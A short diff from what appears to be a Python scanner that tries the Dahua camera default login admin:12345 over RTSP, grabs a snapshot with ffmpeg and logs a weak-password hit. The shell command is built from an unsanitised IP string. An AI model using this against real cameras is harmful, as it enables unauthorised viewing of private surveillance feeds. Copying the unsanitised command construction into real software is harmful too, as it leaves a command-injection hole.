@@ -12,11 +12,12 @@ import os
 
 def get_rtsp(ip: str, save_path: Path) -> bool:
     """根据rtsp地址获取摄像头快照"""
-    cmd = f'ffmpeg -rw_timeout 10 -i "rtsp://admin:12345@{ip}:554/cam/realmonitor?channel=1&subtype=0" -y -f mjpeg -t 0.001 -s 1280x720 {save_path.joinpath(ip+".jpg")}'
-    # res = run_cmd(cmd)
-    res = os.system(cmd)
+    cmd = f'ffmpeg -i "rtsp://admin:12345@{ip}:554/cam/realmonitor?channel=1&subtype=0" -y -f mjpeg -t 0.001 -s 1280x720 {save_path.joinpath(ip+".jpg")}'
+    res = run_cmd(cmd)
+    # res = os.system(cmd)
     # if res and ("401" not in res[1]) and ("404" not in res[1]):
-    if res == 0:
+    if res:
+        # if res == 0:
         logger.success(f"[+] IP:{ip},大华rstp弱密码成功!")
         return True
 
